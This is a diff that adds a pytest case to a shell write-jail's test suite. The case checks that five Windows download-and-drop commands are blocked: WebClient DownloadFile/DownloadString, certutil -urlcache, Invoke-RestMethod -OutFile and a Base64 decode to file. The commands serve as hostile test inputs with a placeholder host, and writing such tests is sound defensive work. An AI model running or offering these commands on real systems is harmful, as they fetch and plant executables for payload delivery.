@@ -415,6 +415,26 @@ def test_shell_write_jail_blocks_fsutil_createnew(tmp_path: Path):
     assert "outside" in hit.lower() or "write root" in hit.lower()
 
 
+def test_shell_write_jail_blocks_download_drop_vectors(tmp_path: Path):
+    """WebClient / certutil urlcache / FromBase64 / IRM -OutFile hide destinations."""
+    from remedy.core.shell_write_jail import check_shell_write_jail
+
+    proj = tmp_path / "proj"
+    proj.mkdir()
+    for cmd in (
+        r"(New-Object Net.WebClient).DownloadFile('http://x','C:\Users\Public\p.exe')",
+        r"certutil -urlcache -split -f http://x/a.exe C:\Users\Public\a.exe",
+        r"[Convert]::FromBase64String('YWJj') | Set-Content out.bin",
+        r"Invoke-RestMethod http://x -OutFile C:\Users\Public\p.bin",
+        r"$wc = New-Object System.Net.WebClient; $wc.DownloadString('http://x')",
+    ):
+        hit = check_shell_write_jail(
+            cmd, write_roots=[proj], cwd=proj, project_bound=True
+        )
+        assert hit is not None, f"expected block for: {cmd}"
+        assert "encoded" in hit.lower() or "cannot be proven" in hit.lower()
+
+
 def test_shell_write_jail_blocks_bare_ps_var_path(tmp_path: Path):
     from remedy.core.shell_write_jail import check_shell_write_jail
 
